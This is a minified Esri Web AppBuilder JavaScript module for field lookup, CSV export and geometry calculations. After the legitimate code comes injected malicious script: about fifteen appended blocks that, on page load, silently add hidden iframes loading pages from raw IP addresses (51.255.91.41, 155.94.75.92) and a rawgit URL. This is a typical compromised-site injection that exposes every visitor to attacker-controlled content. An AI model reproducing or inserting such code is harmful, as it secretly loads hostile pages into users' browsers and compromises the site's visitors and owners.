// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/array dojo/_base/lang dojo/dom-class dojo/dom-geometry dojo/dom-style esri/tasks/query esri/geometry/geometryEngine esri/geometry/Polyline ./CSVUtils jimu/utils".split(" "),function(k,l,n,p,q,C,m,D,B,u){function w(a){return function(b,d){return b.attributes[a]<d.attributes[a]?-1:b.attributes[a]>d.attributes[a]?1:0}}return{getFields:function(a,b,d,e){var c=this.getSkipFields(a),f=[];if(!d&&b.advStat&&b.advStat.stats&&b.advStat.stats.outFields&&0<b.advStat.stats.outFields.length)k.forEach(b.advStat.stats.outFields,
function(a){f.push(a.expression)});else{if(a.infoTemplate)b=a.infoTemplate.info.fieldInfos;else if(0<e.map.itemInfo.itemData.operationalLayers.length){e=e.map.itemInfo.itemData.operationalLayers;b=null;var g=0;a:for(;g<e.length;g++){var h=e[g];if("ArcGISMapServiceLayer"===h.layerType&&"undefined"!==typeof h.layers)for(var t=0;t<h.layers.length;t++){var l=h.layers[t];if(l.id===a.layerId&&l.popupInfo){b=l.popupInfo.fieldInfos;break a}}}b||(b=a.fields)}else b=a.fields;if(b)for(e=0;e<b.length;e++)g=b[e],
d||"undefined"===typeof g.visible?(g=g.name?g.name:g.fieldName,-1===c.indexOf(g)&&f.push(g)):g.visible&&-1===c.indexOf(g.fieldName)&&f.push(g.fieldName)}a=this.getSpecialFields(a);return{dateFields:a.dateFields,specialFields:a.specialFields,typeIdField:a.typeIdField,types:a.types,fields:3<f.length&&!d?f.slice(0,3):f,allFields:f}},getField:function(a,b){for(var d=0;d<a.length;d++){var e=a[d];if(e.name===b||e.alias===b)return e}},getFieldValue:function(a,b,d,e,c,f,g){var h=b;d[a]&&(d=d[a],h="esriFieldTypeDate"===
d.type?u.fieldFormatter.getFormattedDate(new Date(b),"undefined"!==e[a]?{dateFormat:e[a]}:{dateFormat:c}):a===f?u.fieldFormatter.getTypeName(b,g):u.fieldFormatter.getCodedValue(d.domain,b));return h},getSkipFields:function(a){var b=[];if(a.fields)for(var d=0;d<a.fields.length;d++){var e=a.fields[d];e&&e.type&&e.name&&"esriFieldTypeGeometry"===e.type&&b.push(e.name)}a.globalIdField&&""!==a.globalIdField&&b.push(a.globalIdField);a.objectIdField&&""!==a.objectIdField&&b.push(a.objectIdField);return b},
getSpecialFields:function(a){var b={},d=[];a.fields&&k.forEach(a.fields,l.hitch(this,function(e){if("esriFieldTypeDate"===e.type||e.domain||e.name===a.typeIdField){if("esriFieldTypeDate"===e.type&&a.infoTemplate)for(var c in a.infoTemplate._fieldsMap)"undefined"!==typeof a.infoTemplate._fieldsMap[c].fieldName&&a.infoTemplate._fieldsMap[c].fieldName===e.name&&a.infoTemplate._fieldsMap[c].format&&"undefined"!==typeof a.infoTemplate._fieldsMap[c].format.dateFormat&&(d[e.name]=a.infoTemplate._fieldsMap[c].format.dateFormat);
b[e.name]=e}}));return{specialFields:b,dateFields:d,typeIdField:a.typeIdField,types:a.types}},getSummaryFields:function(){},getPopupFields:function(a){var b=[];0<a.tabLayers.length&&k.forEach(a.tabLayers,l.hitch(this,function(a){var e=this.getSkipFields(a);"undefined"!==typeof a.popupInfo?k.forEach(a.popupInfo.fieldInfos,l.hitch(this,function(a){if(a.visible&&-1===e.indexOf(a.fieldName)){var c={value:0};c.expression=a.fieldName;c.label=a.label;b.push(c)}})):a.infoTemplate&&k.forEach(a.infoTemplate.info.fieldInfos,
l.hitch(this,function(a){if(a.visible&&-1===e.indexOf(a.fieldName)){var c={value:0};c.expression=a.fieldName;c.label=a.label;b.push(c)}}))}));return b},getDisplayFields:function(a){var b;"undefined"!==typeof a.advStat&&"undefined"!==typeof a.advStat.stats&&"undefined"!==typeof a.advStat.stats.outFields?b=a.advStat.stats.outFields:(b=[],0<a.tabLayers.length&&k.forEach(a.tabLayers,l.hitch(this,function(a){"undefined"!==typeof a.popupInfo?k.forEach(a.popupInfo.fieldInfos,l.hitch(this,function(a){if(a.visible){var c=
{value:0};c.expression=a.fieldName;c.label=a.label;b.push(c)}})):a.infoTemplate?k.forEach(a.infoTemplate.info.fieldInfos,l.hitch(this,function(a){if(a.visible){var c={value:0};c.expression=a.fieldName;c.label=a.label;b.push(c)}})):k.forEach((a.layerObject?a.layerObject:a).fields,l.hitch(this,function(a){var c={value:0};c.expression=a.name;c.label=a.alias;b.push(c)}))})));return b},exportToCSV:function(a,b,d,e,c){if(0===a.length)return!1;var f=c.baseLabel,g=[],h=[];"proximity"===c.type&&a.sort(this.compareDistance);
var t;"undefined"===typeof b.altKey?t=b:(t=!1,d=c.csvAllFields);k.forEach(a,function(a){"proximity"!==c.type&&"closest"!==c.type||delete a.attributes.DISTANCE;g.push(a.attributes)});if("summary"===c.type||"grouped"===c.type)if(!0===c.csvAllFields||"true"===c.csvAllFields)for(var m in g[0])h.push(m);else for(a=0;a<c.summaryFields.length;a++)h.push(c.summaryFields[a].field);else for(var n in g[0])h.push(n);a=c.layer;m=a.fields;if(a&&a.loaded&&m||t){n=b?[]:this.getSkipFields(a);var r={};if(c.opLayers&&
c.opLayers._layerInfos){var v=c.opLayers.getLayerInfoById(a.id);v&&(r.popupInfo=v.getPopupInfo())}var v=[],q=0;for(;q<h.length;q++){var p=h[q];if(-1===n.indexOf(p)){var u=!1,z,A=0;b:for(;A<m.length;A++)if(z=m[A],z.name===p){u=!0;break b}u?v.push(z):v.push({name:p,alias:p,show:!0,type:"esriFieldTypeString"})}}r.datas=g;r.fromClient=!1;r.withGeometry=!1;r.outFields=v;r.formatDate=!0;r.formatCodedValue=!0;r.formatNumber=!1;var x=[],y=[];if(!b&&d&&"undefined"!==typeof e)switch(c.type){case "proximity":x.push(c.nlsCount);
y.push(e);break;case "closest":var w=0;k.forEach(e,l.hitch(this,function(a){0===w&&(k.forEach(a,function(a){x.push(a.label)}),w+=1);var b=[];k.forEach(a,function(a){b.push(a.value)});y.push(b)}));break;case "summary":k.forEach(e,l.hitch(this,function(a){var b=a.info.replace("\x3cbr/\x3e",""),e=!1,d=0;a:for(;d<c.calcFields.length;d++)if(b===c.calcFields[d].alias){e=!0;break a}e&&(x.push(b),y.push(a.total))}));break;case "grouped":k.forEach(e,function(a){x.push(a.info.replace("\x3cbr/\x3e",""));y.push(a.total)})}if(t)return{summaryLayer:a,
details:v};B.exportCSVFromFeatureLayer(f,a,r);return{summaryLayer:a,details:{appendColumns:x,appendDatas:y,name:f,type:c.nlsValue}}}B.exportCSV(f,g,h)},isURL:function(a){return/(https?:\/\/|ftp:)/g.test(a)},isEmail:function(a){return/\S+@\S+\.\S+/.test(a)},queryTabCount:function(){},performQuery:function(){},getGeoms:function(a){for(var b=[],d=[],e=0;e<a.length;e++){var c=a[e].geometry?a[e].geometry:a[e];if("polygon"===c.type&&-1===b.indexOf(e)){for(var f=0;f<a.length;f++)if(f!==e&&-1===b.indexOf(f)){var g=
a[f].geometry?a[f].geometry:a[f];"polygon"===g.type?m.intersects(c,g)&&(b.push(f),c=m.union(c,g)):b.push(f)}d.push(c)}}return d},createDefArray:function(a,b){for(var d=[],e=0;e<a.length;e++){var c=a[e];if(c){var f=new C;f.returnGeometry=!1;f.geometry=b;"undefined"!==typeof c.queryCount?d.push(c.queryCount(f)):"undefined"!==typeof c.queryIds?d.push(c.queryIds(f)):"undefined"!==typeof c.queryFeatures&&d.push(c.queryFeatures(f))}}return d},updateTabCount:function(a,b,d,e,c){var f="undefined"!==typeof c&&
0<c?!0:!1;c=p.position(b).w;"undefined"!==typeof a&&0===a?(n.remove(b,"noFeatures"),n.remove(b,"noFeaturesActive"),n.add(b,f?"noFeaturesActive":"noFeatures")):(f&&n.contains(b,"noFeatures")&&n.remove(b,"noFeatures"),f&&n.contains(b,"noFeaturesActive")&&n.remove(b,"noFeaturesActive"));d&&(a="undefined"!==typeof a?e+" ("+u.localizeNumber(a).toString()+")":e,b.innerHTML=a);d=p.position(b).w;a=0;var g;d>c?(g=!0,a=d-c):c>d&&(g=!1,a=c-d);c=p.position(b.parentNode).w;if(0<c){g=g?c+a:c-a;q.set(b.parentNode,
"width",g+"px");b=b.parentNode.parentNode;c=b.parentNode;var h;if(c&&c.children&&0<c.children.length)for(a=0;a<c.children.length;a++)if(d=c.children[a],-1<d.className.indexOf("SA_panelRight")){h=d;break}h&&b&&(g>p.position(c).w?(q.set(b,"right","58px"),q.set(h,"display","block")):(q.set(b,"right","24px"),q.set(h,"display","none")))}},getSum:function(a,b){var d=0;k.forEach(a,function(a){d+=a.attributes[b]});return d},getMin:function(a,b){a.sort(w(b));return a[0].attributes[b]},getMax:function(a,b){a.sort(w(b));
a.reverse();return a[0].attributes[b]},getArea:function(a,b,d,e){var c=0;d=l.clone(d);d.miles=109413;d.kilometers=109414;d.feet=109405;d.meters=109404;d.yards=109442;d.nauticalMiles=109409;var f=d[e];k.forEach(a,function(a){for(var d=0;d<b.length;d++){var e=m.intersect(a.geometry,b[d]);null!==e&&(c+=m.geodesicArea(e,f))}});return c},getLength:function(a,b,d,e){var c=0,f=d[e];k.forEach(a,function(a){for(var d=0;d<b.length;d++){var e=m.intersect(a.geometry,b[d]);null!==e&&(c+=m.geodesicLength(e,f))}});
return c},getDistance:function(a,b,d){var e="point"!==a.type?a.getExtent().getCenter():a;b="point"!==b.type?b.getExtent().getCenter():b;e=new D([[e.x,e.y],[b.x,b.y]]);e.spatialReference=a.spatialReference;d="nauticalMiles"===d?"nautical-miles":d;return 4326===a.spatialReference.wkid||a.spatialReference.isWebMercator()?m.geodesicLength(e,d):m.planarLength(e,d)},compareDistance:function(a,b){return a.attributes.DISTANCE<b.attributes.DISTANCE?-1:a.attributes.DISTANCE>b.attributes.DISTANCE?1:0}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});